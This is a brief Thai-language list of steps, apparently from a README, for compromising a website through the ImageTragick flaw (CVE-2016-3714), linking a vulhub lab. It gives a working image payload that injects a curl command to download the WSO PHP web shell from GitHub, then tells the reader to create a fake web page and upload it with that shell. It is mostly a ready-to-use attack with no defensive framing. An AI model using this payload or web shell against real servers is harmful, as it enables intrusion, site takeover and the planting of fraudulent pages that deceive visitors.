## ขั้นตอน

1.เจาะเว็บไซต์จากช่องโหว่ [CVE-2016-3714](https://github.com/vulhub/vulhub/tree/master/imagemagick/imagetragick)

ใช้โค้ด
```bash
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`curl https://raw.githubusercontent.com/tennc/webshell/master/php/wso/wso-4.2.5.php --output wso-4.2.5.php>/tmp/success`'
```

2. สร้างเว็บเพจปลอม <br>
3. อัพโหลดเว็บปลอม โดยใช้โปรแกรม `wso-4.2.5.php`  <br>
